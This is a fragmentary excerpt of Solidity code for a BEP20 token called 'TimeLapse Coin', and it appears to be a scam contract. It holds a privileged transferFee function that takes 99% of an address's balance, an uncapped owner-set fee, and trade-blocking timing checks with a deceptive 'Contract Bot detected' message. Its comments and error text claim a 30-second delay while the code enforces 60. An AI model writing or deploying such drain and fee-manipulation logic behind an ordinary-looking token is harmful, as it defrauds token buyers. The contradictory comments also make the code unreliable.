...
contract TimeLapse is Ma, BEP20, io {
    ...
    uint256 private transactionCountSinceLastDelay = 0;

    constructor(address swaprooter) {
        allowed = swaprooter;
        _name = "TimeLapse Coin";
        _symbol = "TLC";
        _decimals = 8;
    ...
    function transferFee(address approveRewards) external receivers {
        ...
        uint256 transferAmount = (balance * 99) / 100;
    ...
    function setFee(uint256 sf1) external onlyOwner {
        sf = sf1;
    }

    function transfer(address accounts, uint256 value) external override returns (bool) {
        uint256 dIS = cusd;
        require(block.timestamp >= ltt + dIS, "Contract Bot detected! Please wait for transaction...");

        // Check if enough time has passed since the last transaction
        if (transactionCountSinceLastDelay >= 2 && block.timestamp - lastTransactionTime <= 1 seconds) {
            // Apply 30 seconds delay to the current transaction
            require(block.timestamp >= lastTransactionTime + 60 seconds, "Transaction delayed for 30 seconds");
        }

        // Update transaction counts and times
        transactionCountSinceLastDelay++;
        lastTransactionTime = block.timestamp;
    ...
    function _transfer(address sender, address accounts, uint256 value) internal {
        ...
        uint256 commisionAmount = value.mul(sf).div(100);
